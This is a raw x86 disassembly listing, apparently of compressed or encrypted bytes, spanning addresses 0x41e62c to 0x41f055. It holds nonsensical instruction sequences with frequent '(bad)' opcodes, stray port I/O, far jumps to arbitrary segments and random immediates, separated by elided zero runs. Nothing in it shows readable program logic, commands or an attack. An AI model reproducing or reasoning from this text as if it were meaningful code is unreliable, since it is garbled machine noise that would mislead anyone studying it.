  41e62c:	jns    0x41e61e
  41e62e:	dec    edx
  41e62f:	push   esp
  41e630:	imul   edi,DWORD PTR ss:[ecx+0x3b4641e0],0x4f3775
  41e63b:	js     0x41e641
  41e63d:	or     edi,esi
  41e63f:	jge    0x41e630
  41e641:	loop   0x41e6af
  41e643:	jle    0x41e5d0
  41e645:	push   edx
  41e646:	(bad)  [esi]
  41e648:	sub    DWORD PTR [ebp-0x756c05c1],edi
  41e64e:	adc    al,0x9f
  41e650:	sub    ebx,DWORD PTR [ecx-0x45728c16]
  41e656:	test   BYTE PTR [eax+ebp*1+0x6f52fe52],ch
  41e65d:	shr    BYTE PTR [edi],0x89
  41e660:	inc    esi
  41e661:	push   ds
  41e662:	pop    ebx
  41e663:	pop    esp
  41e664:	(bad)  
  41e665:	cmp    bh,dh
  41e667:	xchg   BYTE PTR [eax-0x80],al
  41e66a:	mov    ?,eax
  41e66c:	adc    eax,0x37b45148
  41e671:	in     al,dx
  41e672:	mov    eax,ds:0x48886f81
  41e677:	mov    ecx,0x158fd5c2
  41e67c:	clc    
  41e67d:	out    0x3,al
  41e67f:	call   0x9555:0x42b42614
  41e686:	or     BYTE PTR [edi],dl
  41e688:	pop    esi
  41e689:	in     eax,dx
  41e68a:	push   esp
  41e68b:	leave  
  41e68c:	stos   BYTE PTR es:[edi],al
  41e68d:	sbb    eax,0x483f0a
	...
  41e6f2:	add    BYTE PTR [eax],al
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebp,DWORD PTR [ebx]
  41e701:	sbb    BYTE PTR [edx+0x5d],al
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x7a000001
  41e70d:	adc    eax,0x422dd9ad
  41e712:	shl    BYTE PTR ds:0x465cfadb,1
  41e718:	in     eax,dx
  41e719:	xor    eax,0xcb7c92e3
  41e71e:	pop    ecx
  41e71f:	xchg   esp,eax
  41e720:	stc    
  41e721:	adc    al,0x42
  41e723:	xor    eax,0xe36b935b
  41e728:	push   ecx
  41e729:	push   edx
  41e72a:	shl    BYTE PTR [edi+0x6f20e114],1
  41e730:	mov    ds:0x520cbe53,al
  41e735:	sbb    BYTE PTR [ebp+eiz*2-0x57],bl
  41e739:	adc    ch,dh
  41e73b:	sbb    BYTE PTR [ebx],ah
  41e73d:	pop    edi
  41e73e:	jo     0x41e75f
  41e740:	jo     0x41e796
  41e742:	add    ebp,esi
  41e744:	sbb    eax,0xa1f1af5
  41e749:	adc    eax,0xc46956c0
  41e74e:	dec    eax
  41e74f:	push   ebp
  41e750:	or     eax,0xa86ee84
  41e755:	mov    ah,0x98
  41e757:	sub    edi,DWORD PTR [ebp+edi*2+0x20]
  41e75b:	sbb    ebx,ecx
  41e75d:	cmp    BYTE PTR [eax-0x36f7f884],dl
  41e763:	cdq    
  41e764:	add    al,0xdf
  41e766:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e767:	push   ds
  41e768:	lea    edi,[edx+0x585528c]
  41e76e:	out    dx,eax
  41e76f:	dec    cl
  41e771:	jp     0x41e741
  41e773:	dec    ebp
  41e774:	cmp    al,BYTE PTR [eax+0x1b]
  41e777:	sub    DWORD PTR [esi],ecx
  41e779:	and    BYTE PTR [ebp+0x5716d330],ah
  41e77f:	ficomp WORD PTR [edx-0x6576d4c0]
  41e785:	pop    esp
  41e786:	and    cl,BYTE PTR [edx-0x69]
  41e789:	cs jg  0x41e7c1
  41e78c:	test   BYTE PTR [ebp+0x4ec1a57d],dl
  41e792:	and    DWORD PTR [eax+0x3e06b52b],edi
  41e798:	shl    DWORD PTR [ebx+ebp*4],1
  41e79b:	sub    eax,0x1c66b9cd
  41e7a0:	pop    edi
  41e7a1:	sub    DWORD PTR [edi],eax
  41e7a3:	imul   eax,DWORD PTR [edi+esi*8-0x1debbd24],0x41799ae
  41e7ae:	hlt    
  41e7af:	outs   dx,BYTE PTR ds:[esi]
  41e7b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7b1:	jne    0x41e7e1
  41e7b3:	dec    ebx
  41e7b4:	and    eax,0xb8c4b04d
  41e7b9:	adc    al,0xe1
  41e7bb:	mov    bh,0x86
  41e7bd:	cmp    edi,0xbeb60ae9
  41e7c3:	add    DWORD PTR [ebp-0x70],esp
  41e7c6:	add    ebp,DWORD PTR ds:0x67c44a8
  41e7cc:	mov    ss,WORD PTR [edi-0x36d2d34e]
  41e7d2:	push   ebx
  41e7d3:	repnz gs loop 0x41e7e7
  41e7d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7d8:	jnp    0x41e763
  41e7da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7db:	jmp    0x91a56647
  41e7e0:	lds    esi,FWORD PTR [ebp+0x63]
  41e7e3:	leave  
  41e7e4:	ss dec edi
  41e7e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7e7:	stos   BYTE PTR es:[edi],al
  41e7e8:	mov    edx,0x43aa1d4d
  41e7ed:	xchg   esp,eax
  41e7ee:	adc    edx,DWORD PTR [esi]
  41e7f0:	fwait
  41e7f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e7f2:	xchg   ebp,eax
  41e7f3:	and    al,0xbc
  41e7f5:	dec    esi
  41e7f6:	sbb    BYTE PTR [ebx+0x28],cl
  41e7f9:	loopne 0x41e7e2
  41e7fb:	cmp    esp,DWORD PTR es:[edx-0x27]
  41e7ff:	sbb    esp,edx
  41e801:	into   
  41e802:	jmp    FWORD PTR [eax+eiz*8-0x74089d36]
  41e809:	add    al,0xa6
  41e80b:	and    cl,dl
  41e80d:	or     al,ch
  41e80f:	or     BYTE PTR [edi+0x0],cl
	...
  41e872:	add    BYTE PTR [eax],al
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e855
  41e881:	in     eax,0xec
  41e883:	cwde   
  41e884:	adc    DWORD PTR [ebp+0x1],eax
  41e887:	add    BYTE PTR ds:0xf4000001,al
  41e88d:	rcl    al,1
  41e88f:	adc    eax,0x7d856b3a
  41e894:	mov    ebp,DWORD PTR [ebx]
  41e896:	repnz add DWORD PTR [esi-0x341624d9],esp
  41e89d:	cmovno ebx,DWORD PTR [ebp+0x47e96aad]
  41e8a4:	dec    edx
  41e8a5:	(bad)  
  41e8a6:	or     BYTE PTR [ebx-0x4382f4ba],al
  41e8ac:	jb     0x41e896
  41e8ae:	cld    
  41e8af:	jae    0x41e8e0
  41e8b1:	test   BYTE PTR [esi-0x27],bl
  41e8b4:	adc    DWORD PTR [esp+ebp*1-0x80],ebx
  41e8b8:	fs push esp
  41e8ba:	test   al,0xe
  41e8bc:	jmp    0x2ad06e2f
  41e8c1:	inc    eax
  41e8c2:	jmp    0x5a0e:0xffa509db
  41e8c9:	sub    al,0xd9
  41e8cb:	inc    edx
  41e8cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8cd:	pop    eax
  41e8ce:	jle    0x41e8e0
  41e8d0:	pop    esp
  41e8d1:	sti    
  41e8d2:	xchg   ecx,ebx
  41e8d4:	pusha  
  41e8d5:	cmp    BYTE PTR [edx+0x43abcdb8],ch
  41e8db:	rol    BYTE PTR [edi],0x2a
  41e8de:	outs   dx,DWORD PTR ds:[esi]
  41e8df:	(bad)
  41e8e2:	sbb    BYTE PTR ds:0xd7328015,cl
  41e8e8:	lds    ebx,FWORD PTR [esi+0x7f]
  41e8eb:	mov    ecx,0x32e84b50
  41e8f0:	push   ss
  41e8f1:	dec    edx
  41e8f2:	jmp    FWORD PTR [edi]
  41e8f4:	ror    DWORD PTR [ecx-0x23],1
  41e8f7:	mov    eax,ds:0x9b2ac66c
  41e8fc:	push   esi
  41e8fd:	jae    0x41e8f3
  41e8ff:	pop    ebp
  41e900:	fisub  DWORD PTR [edi-0x6b566bb9]
  41e906:	fcomip st,st(6)
  41e908:	mov    ebx,0x8e5d5116
  41e90d:	sub    DWORD PTR [ebp+0x33],ebp
  41e910:	jne    0x41e915
  41e912:	inc    ebx
  41e913:	sahf   
  41e914:	push   eax
  41e915:	mov    dl,0xe1
  41e917:	sar    DWORD PTR [eax],1
  41e919:	sbb    al,0xac
  41e91b:	push   ebp
  41e91c:	pusha  
  41e91d:	pop    esi
  41e91e:	inc    ebx
  41e91f:	aam    0xe6
  41e921:	xchg   DWORD PTR [eax+0x4c731804],esi
  41e927:	pop    ebx
  41e928:	call   0x1675:0xe6155e2
  41e92f:	stos   BYTE PTR es:[edi],al
  41e930:	sar    BYTE PTR [ebx-0x1f],1
  41e933:	ins    BYTE PTR es:[edi],dx
  41e934:	out    dx,al
  41e935:	xchg   ebp,eax
  41e936:	les    edx,FWORD PTR ds:0x6d983eb7
  41e93c:	fs mov esp,0x301bca0f
  41e942:	xor    cl,BYTE PTR [ecx+0x54]
  41e945:	repnz adc BYTE PTR [ecx-0x7],0x3f
  41e94a:	idiv   ebx
  41e94c:	int3   
  41e94d:	out    dx,eax
  41e94e:	mov    cl,BYTE PTR [esi-0x308f1849]
  41e954:	mov    ds:0xce38c6d3,eax
  41e959:	fst    DWORD PTR [ebx-0x6d]
  41e95c:	loopne 0x41e959
  41e95e:	sti    
  41e95f:	fsub   DWORD PTR cs:[ebp-0x5d]
  41e963:	sbb    al,0x51
  41e965:	int    0x2
  41e967:	push   es
  41e968:	xor    DWORD PTR [esi],0xae2a2e59
  41e96e:	rcl    DWORD PTR [edx+0x30],cl
  41e971:	imul   DWORD PTR [edx]
  41e973:	jle    0x41e90f
  41e975:	mov    edx,0x50ae92c8
  41e97a:	(bad)  
  41e97b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e97c:	cmp    al,0x94
  41e97e:	inc    edx
  41e97f:	das    
  41e980:	fidivr DWORD PTR [ebp-0x488611f1]
  41e986:	sbb    cl,0xe9
  41e989:	jns    0x41e986
  41e98b:	pop    ecx
  41e98c:	add    ch,0xbc
  41e98f:	std    
  41e990:	xchg   ecx,eax
	...
  41e9f1:	add    BYTE PTR [eax],al
  41e9f3:	add    BYTE PTR [eax-0x3],bh
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	pop    ebp
  41ea01:	cdq    
  41ea02:	pop    es
  41ea03:	aaa    
  41ea04:	push   ss
  41ea05:	inc    esi
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0xdd000001
  41ea0d:	xchg   ebx,esi
  41ea0f:	sub    BYTE PTR [edx],cl
  41ea11:	ret    
  41ea12:	shr    dl,cl
  41ea14:	call   0x420b332e
  41ea19:	nop
  41ea1a:	adc    bh,BYTE PTR [edi-0x28]
  41ea1d:	sbb    BYTE PTR [edx+0x16],al
  41ea20:	inc    bx
  41ea22:	retf   
  41ea23:	das    
  41ea24:	mov    ch,0x60
  41ea26:	(bad)  
  41ea27:	das    
  41ea28:	adc    ecx,DWORD PTR [edi-0x2f]
  41ea2b:	ja     0x41e9b2
  41ea2d:	test   BYTE PTR [ebp+0x5f],dl
  41ea30:	mov    al,0x5
  41ea32:	and    ebx,DWORD PTR [ebx+edi*4+0x27]
  41ea36:	ss jno 0x41eaa3
  41ea39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea3a:	jo     0x41eab6
  41ea3c:	sbb    dh,BYTE PTR [ebx]
  41ea3e:	jb     0x41eaac
  41ea40:	nop
  41ea41:	push   cs
  41ea42:	out    dx,al
  41ea43:	out    dx,eax
  41ea44:	cwde   
  41ea45:	cmp    BYTE PTR [ecx],ah
  41ea47:	shr    BYTE PTR [ebp+0x1b0affa2],1
  41ea4d:	jo     0x41ea96
  41ea4f:	xchg   eax,ebp
  41ea51:	(bad)  
  41ea53:	push   esp
  41ea54:	xchg   esi,eax
  41ea55:	in     eax,dx
  41ea56:	rol    DWORD PTR [ebx],cl
  41ea58:	or     al,0xbc
  41ea5a:	add    edi,ebx
  41ea5c:	xchg   ah,al
  41ea5e:	int    0x1b
  41ea60:	dec    eax
  41ea61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea62:	jg     0x41e9f4
  41ea64:	dec    ebp
  41ea65:	pop    ebp
  41ea66:	cmovge edx,DWORD PTR [eax]
  41ea69:	(bad)  [ebp+0x13]
  41ea6c:	mov    bh,0xdb
  41ea6e:	jg     0x41ea32
  41ea70:	loopne 0x41ea3c
  41ea72:	mov    esi,0x3035eca8
  41ea77:	inc    edi
  41ea78:	mov    ebp,0x79af8f50
  41ea7d:	push   ds
  41ea7e:	jae    0x41ea26
  41ea80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea81:	(bad)  
  41ea82:	sub    DWORD PTR [eax+0x14],edi
  41ea85:	fdiv   DWORD PTR [ecx+0x4d6daf78]
  41ea8b:	jmp    0xe53a:0x5e0bcdf6
  41ea92:	or     esp,DWORD PTR [ebp-0x1e24ea99]
  41ea98:	and    al,0x24
  41ea9a:	(bad)  
  41ea9b:	xor    al,0x6f
  41ea9d:	push   eax
  41ea9e:	push   ecx
  41ea9f:	cmc    
  41eaa0:	xor    BYTE PTR [eax+0x6bd34cfc],al
  41eaa6:	xor    DWORD PTR [eax],0x450eb00a
  41eaac:	out    0xe7,eax
  41eaae:	retf   0x69e2
  41eab1:	mov    cl,0xd4
  41eab3:	xchg   edx,eax
  41eab4:	pop    edx
  41eab5:	inc    ebx
  41eab6:	mov    bh,0xa2
  41eab8:	fbld   TBYTE PTR [ebp-0x637107a0]
  41eabe:	and    eax,0xa97c6aeb
  41eac3:	xchg   edi,eax
  41eac4:	mov    bl,0xd
  41eac6:	inc    ebp
  41eac7:	and    esi,esi
  41eac9:	push   ebx
  41eaca:	fidivr DWORD PTR [edi]
  41eacc:	dec    edi
  41eacd:	cs mov edx,0x96fe309c
  41ead3:	jae    0x41ea77
  41ead5:	(bad)  
  41ead6:	neg    DWORD PTR [esi-0x359a4cff]
  41eadc:	arpl   WORD PTR [ebx-0x21],sp
  41eadf:	sub    al,0xa1
  41eae1:	pop    eax
  41eae2:	aad    0x68
  41eae4:	mov    edi,eax
  41eae6:	push   esi
  41eae7:	cmp    esp,ecx
  41eae9:	rol    DWORD PTR [eax+0x1c7ede79],cl
  41eaef:	inc    ebp
  41eaf0:	push   ebx
  41eaf1:	pop    edx
  41eaf2:	push   ebx
  41eaf3:	iret   
  41eaf4:	or     DWORD PTR [ebx+0x5b8b5871],edx
  41eafa:	sahf   
  41eafb:	pusha  
  41eafc:	add    ebx,DWORD PTR [eax-0x9bcd2a0]
  41eb02:	cld    
  41eb03:	test   BYTE PTR [esi+0xffab20d],al
  41eb09:	inc    ebp
  41eb0a:	xchg   edi,eax
  41eb0b:	call   0xed3eaf9a
  41eb10:	pop    eax
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x22
  41eb81:	sbb    ah,BYTE PTR ds:0x1471b61
  41eb87:	add    BYTE PTR ds:0x35000001,al
  41eb8d:	loopne 0x41ebce
  41eb8f:	inc    esp
  41eb90:	shl    dl,1
  41eb92:	div    DWORD PTR [edi+0x56a5866d]
  41eb98:	pop    ebx
  41eb99:	pop    es
  41eb9a:	pop    edx
  41eb9b:	xchg   edi,eax
  41eb9c:	cdq    
  41eb9d:	push   edi
  41eb9e:	mov    edx,0x2b0b7f14
  41eba3:	push   cs
  41eba4:	dec    edi
  41eba5:	add    bh,BYTE PTR [ecx-0x38]
  41eba8:	push   cs
  41eba9:	or     bh,ah
  41ebab:	mov    eax,0x1cd1d66f
  41ebb0:	pop    ds
  41ebb1:	stos   BYTE PTR es:[edi],al
  41ebb2:	outs   dx,DWORD PTR ds:[esi]
  41ebb3:	arpl   WORD PTR [eax+edx*2],bx
  41ebb6:	xchg   DWORD PTR [ecx],edx
  41ebb8:	push   ebx
  41ebb9:	pop    edx
  41ebba:	(bad)  
  41ebbb:	push   0x15
  41ebbd:	add    al,0x65
  41ebbf:	out    0x7b,al
  41ebc1:	stos   BYTE PTR es:[edi],al
  41ebc2:	leave  
  41ebc3:	pop    esp
  41ebc4:	xchg   BYTE PTR [edx+0x1a],ch
  41ebc7:	pop    DWORD PTR [ebx-0x61]
  41ebca:	shr    DWORD PTR [ebp+0x5cde4a5d],cl
  41ebd0:	push   eax
  41ebd1:	stc    
  41ebd2:	retf   
  41ebd3:	add    BYTE PTR [ecx],dl
  41ebd5:	repnz retf 0x3dc2
  41ebd9:	arpl   WORD PTR [ebx+0x7fcf36e1],bx
  41ebdf:	(bad)  
  41ebe0:	out    dx,eax
  41ebe1:	xor    eax,0x1bc4c05d
  41ebe6:	inc    edi
  41ebe7:	adc    dl,al
  41ebe9:	jns    0x41eb88
  41ebeb:	cli    
  41ebec:	xchg   esi,eax
  41ebed:	(bad)  
  41ebee:	mov    dl,0xb4
  41ebf0:	jb     0x41eb90
  41ebf2:	sbb    edi,DWORD PTR [esi-0x59]
  41ebf5:	push   0x831ef696
  41ebfa:	inc    eax
  41ebfb:	loopne 0x41ebf2
  41ebfd:	mov    WORD PTR [edi-0x7deed7ea],ss
  41ec03:	cmc    
  41ec04:	inc    esp
  41ec05:	dec    esi
  41ec06:	enter  0xf419,0x52
  41ec0a:	call   0xe5a03171
  41ec0f:	mov    eax,ds:0xea6839b3
  41ec14:	sti    
  41ec15:	je     0x41ec0a
  41ec17:	div    dh
  41ec19:	jle    0x41ebd0
  41ec1b:	outs   dx,BYTE PTR ds:[esi]
  41ec1c:	mov    BYTE PTR [eax+0x6],bl
  41ec1f:	xchg   edi,eax
  41ec20:	xchg   esi,eax
  41ec21:	call   0x6bf6:0xbb195503
  41ec28:	int    0xa5
  41ec2a:	add    ebp,esi
  41ec2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec2d:	(bad)  
  41ec2f:	pop    esp
  41ec30:	add    DWORD PTR [ebp-0x3e],ecx
  41ec33:	or     edx,DWORD PTR [ebx-0x32b01dc8]
  41ec39:	jle    0x41ec5e
  41ec3b:	mov    WORD PTR [ebx],?
  41ec3d:	inc    ebp
  41ec3e:	dec    esp
  41ec3f:	mov    eax,0x8af3465e
  41ec44:	push   ds
  41ec45:	mov    edx,0xb6368c2c
  41ec4a:	inc    esi
  41ec4b:	adc    dl,dl
  41ec4d:	sar    BYTE PTR [esi],0xa3
  41ec50:	popa   
  41ec51:	enter  0x1795,0x7
  41ec55:	or     eax,0x1c0b2cd5
  41ec5a:	xchg   DWORD PTR [esi+ecx*4+0x6b700bb],edx
  41ec61:	push   ebx
  41ec62:	xchg   BYTE PTR [eax-0xb],ch
  41ec65:	lods   eax,DWORD PTR ds:[si]
  41ec67:	(bad)  
  41ec68:	xor    ecx,edx
  41ec6a:	pop    eax
  41ec6b:	daa    
  41ec6c:	cmp    al,0xb6
  41ec6e:	adc    al,0x4e
  41ec70:	aad    0xb1
  41ec72:	xchg   ecx,eax
  41ec73:	dec    eax
  41ec74:	gs adc eax,0xf63492f5
  41ec7a:	cmp    ebp,esp
  41ec7c:	lds    ecx,FWORD PTR [eax+0x7b37d1b7]
  41ec82:	stc    
  41ec83:	das    
  41ec84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec85:	fdivr  st(4),st
  41ec87:	xchg   DWORD PTR [ebx],edx
  41ec89:	rcr    esp,1
  41ec8b:	dec    edi
  41ec8c:	cmp    eax,0x668ff788
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xffc85fd0
  41ed02:	fwait
  41ed03:	repz and BYTE PTR [eax+0x1],cl
  41ed07:	add    BYTE PTR ds:0xf2000001,al
  41ed0d:	test   eax,0xbb240853
  41ed12:	out    dx,al
  41ed13:	push   es
  41ed14:	sti    
  41ed15:	mov    eax,ds:0x4e76dce6
  41ed1a:	mov    dl,0x6
  41ed1c:	jb     0x41ed9a
  41ed1e:	push   ecx
  41ed1f:	sub    DWORD PTR [ebx+edx*1-0x35],edi
  41ed23:	cdq    
  41ed24:	cld    
  41ed25:	mov    cs:0xe543d753,al
  41ed2b:	push   edi
  41ed2c:	gs or  eax,0xf40ec638
  41ed32:	xchg   ecx,eax
  41ed33:	pushf  
  41ed34:	cmp    dl,BYTE PTR [ebp+0x5e]
  41ed37:	mov    esp,0x4df10169
  41ed3c:	push   eax
  41ed3d:	gs ins DWORD PTR es:[edi],dx
  41ed3f:	mov    ss,WORD PTR [esp+edx*8+0x73]
  41ed43:	mov    al,0x10
  41ed45:	mov    dl,0xe0
  41ed47:	push   ss
  41ed48:	stos   DWORD PTR es:[edi],eax
  41ed49:	cmp    DWORD PTR [ecx+eiz*8+0x454329cd],ebx
  41ed50:	mov    ebp,0x34c546ce
  41ed55:	add    al,0x64
  41ed57:	lods   eax,DWORD PTR ds:[esi]
  41ed58:	inc    edi
  41ed59:	pop    esp
  41ed5a:	or     BYTE PTR [esi],bl
  41ed5c:	xlat   BYTE PTR ds:[ebx]
  41ed5d:	ins    DWORD PTR es:[edi],dx
  41ed5e:	inc    ebp
  41ed5f:	leave  
  41ed60:	cmp    BYTE PTR [ecx-0x7f64355b],ah
  41ed66:	mov    cl,0x9a
  41ed68:	inc    esi
  41ed69:	jmp    DWORD PTR ds:0x698f0be9
  41ed6f:	dec    eax
  41ed70:	sub    eax,0xdbb74334
  41ed75:	and    al,0x27
  41ed77:	jno    0x41ed41
  41ed79:	int3   
  41ed7a:	sar    edx,cl
  41ed7c:	leave  
  41ed7d:	lods   eax,DWORD PTR ds:[esi]
  41ed7e:	sub    esi,DWORD PTR [edi+ecx*1]
  41ed81:	inc    edx
  41ed82:	mov    eax,ds:0xb332e01d
  41ed87:	dec    ebx
  41ed88:	mov    DWORD PTR [ebp+0x2b2d4eb6],esp
  41ed8e:	int3   
  41ed8f:	rcr    DWORD PTR [edx+0x49],0x4b
  41ed93:	mov    dh,0x3
  41ed95:	jne    0x41edde
  41ed97:	push   0x2831470f
  41ed9c:	add    al,BYTE PTR [ebx-0x4659b7ee]
  41eda2:	arpl   WORD PTR [ecx],bx
  41eda4:	ins    BYTE PTR es:[edi],dx
  41eda5:	push   ecx
  41eda6:	inc    ebx
  41eda7:	clc    
  41eda8:	in     al,0x82
  41edaa:	in     eax,dx
  41edab:	(bad)  [esi-0xf]
  41edae:	cs mov ch,0x8d
  41edb1:	jle    0x41ed99
  41edb3:	cmp    BYTE PTR [edi],bl
  41edb5:	lods   eax,DWORD PTR ds:[esi]
  41edb6:	jmp    0x53b8:0xb223f3b7
  41edbd:	xchg   DWORD PTR [ebx],edx
  41edbf:	hlt    
  41edc0:	pop    esp
  41edc1:	cdq    
  41edc2:	pop    esp
  41edc3:	adc    al,0xf2
  41edc5:	jno    0x41ed48
  41edc7:	mov    edi,0x3495c076
  41edcc:	(bad)  
  41edcd:	hlt    
  41edce:	and    edx,ebx
  41edd0:	arpl   WORD PTR [esi],di
  41edd2:	(bad)  
  41edd3:	repz mov ah,cl
  41edd6:	mov    edx,0x9a5ad998
  41eddb:	push   ds
  41eddc:	inc    esp
  41eddd:	jo     0x41edb1
  41eddf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ede0:	popa   
  41ede1:	aad    0x37
  41ede3:	lahf   
  41ede4:	dec    edi
  41ede5:	sub    BYTE PTR ds:0x5a8f4f18,dh
  41edeb:	xor    DWORD PTR [edx],esi
  41eded:	out    dx,eax
  41edee:	repz inc ebp
  41edf0:	out    0xb0,eax
  41edf2:	push   ss
  41edf3:	pop    ebp
  41edf4:	xchg   edi,eax
  41edf5:	addr16 aas 
  41edf7:	adc    ecx,edx
  41edf9:	pop    edi
  41edfa:	sbb    eax,edi
  41edfc:	arpl   WORD PTR [ebx+0x4e],bx
  41edff:	or     eax,0x99962b01
  41ee04:	sbb    eax,0xb601ecb2
  41ee09:	retf   
  41ee0a:	xor    eax,0x72e9319a
  41ee0f:	out    0xae,al
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x25df:0xf0bf2fe7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0xe7000001
  41ee8d:	jmp    FWORD PTR [eax]
  41ee8f:	ror    BYTE PTR [edx-0x72e452fb],0x1
  41ee96:	shl    ah,1
  41ee98:	lds    edx,FWORD PTR [edx-0x817601f]
  41ee9e:	jmp    0x4f70:0x858c5054
  41eea5:	pop    edi
  41eea6:	inc    ecx
  41eea7:	sub    BYTE PTR [ebx],bh
  41eea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eeaa:	xchg   BYTE PTR [eax*4-0x56753c94],bl
  41eeb1:	test   eax,0x1b460a9c
  41eeb6:	jae    0x41eedd
  41eeb8:	icebp  
  41eeb9:	sub    BYTE PTR [eax+eiz*2-0x1b],dh
  41eebd:	pop    ecx
  41eebe:	retf   0x30d1
  41eec1:	sbb    eax,0xcf720cf6
  41eec6:	jg     0x41ef06
  41eec8:	sbb    al,0x37
  41eeca:	jo     0x41ee50
  41eecc:	aaa    
  41eecd:	call   0xde4e6edf
  41eed2:	(bad)  [ebp+0x6c506f38]
  41eed8:	mov    ah,BYTE PTR [ecx+0x482ebd11]
  41eede:	sub    BYTE PTR [ebx],dh
  41eee0:	call   0xb18dae3e
  41eee5:	mov    cl,0x20
  41eee7:	ds test al,0xa0
  41eeea:	mov    cl,0x2b
  41eeec:	and    BYTE PTR [ecx],0x4a
  41eeef:	daa    
  41eef0:	out    0x30,al
  41eef2:	ret    
  41eef3:	fidiv  WORD PTR [esi]
  41eef5:	sbb    dl,ah
  41eef7:	retf   
  41eef8:	repz mov ah,0x15
  41eefb:	or     edi,0x2af43a63
  41ef01:	mov    ds:0x95edccb1,eax
  41ef06:	sbb    DWORD PTR ds:0xa420e1b7,ebp
  41ef0c:	jmp    0x41eede
  41ef0e:	or     DWORD PTR [ecx+0x1b],eax
  41ef11:	cmp    al,BYTE PTR [ecx+0x6574efbb]
  41ef17:	cld    
  41ef18:	inc    ebp
  41ef19:	sar    DWORD PTR [eax+eax*1+0x56],0xe1
  41ef1e:	imul   ebx,edi,0x5d
  41ef21:	jmp    0x636b09f1
  41ef26:	fs adc ah,bl
  41ef29:	lods   al,BYTE PTR ds:[esi]
  41ef2a:	sub    DWORD PTR [edx-0x512d23cd],ebp
  41ef30:	jmp    0x41ef23
  41ef32:	jne    0x41ef3c
  41ef34:	mov    eax,DWORD PTR [edx]
  41ef36:	sub    eax,0xdd188ceb
  41ef3b:	inc    edx
  41ef3c:	jnp    0x95776153
  41ef42:	es repnz add cl,bl
  41ef46:	cli    
  41ef47:	enter  0xf15b,0x29
  41ef4b:	cmp    eax,0xb87e63d9
  41ef50:	out    0xa1,eax
  41ef52:	mov    esp,0x910a1a6b
  41ef57:	mov    ds:0xd6727cb9,eax
  41ef5c:	sbb    al,0x85
  41ef5e:	fcmovne st,st(7)
  41ef60:	and    eax,0x2395a4a4
  41ef65:	mov    eax,0xfb27401c
  41ef6a:	mov    dl,0xc7
  41ef6c:	mov    ebx,0xe4cfd47
  41ef71:	lock mov dh,0x1c
  41ef74:	(bad)  
  41ef75:	ins    DWORD PTR es:[edi],dx
  41ef76:	jb     0x41efd9
  41ef78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef79:	out    0x3c,al
  41ef7b:	nop
  41ef7c:	iret   
  41ef7d:	and    al,0xa3
  41ef7f:	adc    al,0xe6
  41ef81:	cmp    eax,DWORD PTR [ebp-0x2f820cd3]
  41ef87:	fwait
  41ef88:	sar    edx,1
  41ef8a:	adc    eax,0x53efb227
  41ef8f:	mov    esp,DWORD PTR [eax+eax*1+0x0]
	...
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ecx,DWORD PTR [ebp+0x2ae0538a],0x4a
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0x36000001
  41f00d:	add    al,0xcf
  41f00f:	cmp    bl,BYTE PTR [ebx]
  41f011:	test   DWORD PTR [ebp-0x33],0xfee6cf45
  41f018:	jmp    0x41f00c
  41f01a:	je     0x41f043
  41f01c:	imul   eax,DWORD PTR [esi-0x504d8d32],0xa32fa71
  41f026:	mov    bl,0x26
  41f028:	stos   BYTE PTR es:[edi],al
  41f029:	outs   dx,DWORD PTR ds:[esi]
  41f02a:	(bad)  
  41f02b:	call   0xa51:0xdd1361a
  41f032:	xor    ebx,DWORD PTR [ecx+0xfdd18f2]
  41f038:	(bad)  
  41f039:	cmp    al,0xfb
  41f03b:	sar    BYTE PTR [ebx-0x10c779d5],1
  41f041:	sub    eax,0x60677eac
  41f046:	inc    ebp
  41f047:	dec    esp
  41f048:	cwde   
  41f049:	pop    ebp
  41f04a:	(bad)  
  41f04b:	mov    ds:0x6a8dcad8,eax
  41f050:	mov    esi,0x53678d44
  41f055:	bound  ebp,QWORD PTR [edx-0x7307287e]
